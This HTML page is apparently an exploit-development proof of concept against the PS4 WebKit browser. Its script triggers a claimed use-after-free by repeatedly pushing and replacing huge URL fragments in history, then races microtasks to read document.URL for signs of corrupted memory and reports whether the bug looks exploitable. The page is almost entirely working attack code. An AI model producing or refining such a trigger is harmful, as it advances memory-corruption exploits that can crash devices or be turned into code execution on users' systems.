<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Final Fragment Microtask Probe</title>
<style>
body {
    font-family: monospace;
    background: #000;
    color: #0f0;
    padding: 20px;
}
button {
    padding: 12px;
    font-size: 16px;
    font-weight: bold;
}
#log {
    margin-top: 15px;
    white-space: pre-wrap;
    font-size: 12px;
    max-height: 400px;
    overflow-y: auto;
    border: 1px solid #0f0;
    padding: 10px;
}
</style>
</head>
<body>

<h2>Final Fragment Microtask Probe</h2>
<p>Target: detect transient corruption during fragment → inline(32) transition</p>

<button onclick="run()">RUN FINAL TEST</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){
    logEl.textContent += m + "\n";
}

function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

async function run(){
    logEl.textContent = "";
    log("=== UAF TRIGGER START ===");

    let size = 977;
    const STEP = 14461;

    // ----------------------------
    // Phase 1 – Confirmed UAF trigger
    // ----------------------------
    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);
        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");

    // Snapshot before transition
    const baselineLen = document.URL.length;
    log("[BASE] URL.length = " + baselineLen);

    let anomalies = 0;

    // ----------------------------
    // Phase 2 – Microtask race
    // ----------------------------
    Promise.resolve().then(()=>{
        try {
            // Force collapse to inline fragment (~32 bytes)
            location.hash = "#B";
        } catch(e){}
    });

    Promise.resolve().then(()=>{
        try {
            const url = document.URL;
            const probes = [0, 16, 32, 64, 128, 256, 512, 1024];

            for(let i=0;i<probes.length;i++){
                const off = probes[i];
                let v = url.charCodeAt(off);

                if(!Number.isFinite(v) || v < 0 || v > 255){
                    anomalies++;
                    log("[ANOMALY] charCodeAt(" + off + ") = " + v);
                }
            }
        } catch(e){
            anomalies++;
            log("[EXCEPTION] during microtask read");
        }
    });

    Promise.resolve().then(()=>{
        const finalLen = document.URL.length;
        log("[AFTER] URL.length = " + finalLen);

        if(finalLen !== 2 && finalLen !== 3 && finalLen !== 35){
            anomalies++;
            log("[ANOMALY] unexpected final length");
        }

        if(anomalies === 0){
            log("=== RESULT: NO TRANSIENT CORRUPTION OBSERVED ===");
            log("Bug is lifetime-only (DoS / Freeze / Crash)");
        } else {
            log("=== RESULT: TRANSIENT READ ANOMALY DETECTED ===");
            log("This indicates exploitable fragment overlap");
        }
    });
}
</script>
</body>
</html>
